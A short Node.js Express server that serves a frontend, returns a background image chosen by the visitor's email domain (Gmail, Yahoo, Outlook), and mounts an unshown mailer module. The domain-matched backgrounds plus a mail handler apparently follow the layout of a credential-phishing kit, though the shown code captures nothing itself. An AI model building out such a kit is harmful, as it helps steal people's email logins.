const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Serve frontend
app.use(express.static(path.join(__dirname, 'public')));

// Background image route
app.get('/get-bg', (req, res) => {
  const domain = req.query.domain;
  const imageMap = {
    'gmail.com': '/assets/backgrounds/gmail_bg.jpg',
    'yahoo.com': '/assets/backgrounds/yahoo_bg.jpg',
    'outlook.com': '/assets/backgrounds/outlook_bg.jpg'
  };
  res.json({
    imageUrl: imageMap[domain] || '/assets/backgrounds/default_bg.jpg'
  });
});

// Email handler
const mailerRoute = require('./mailer');
app.use(mailerRoute);

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
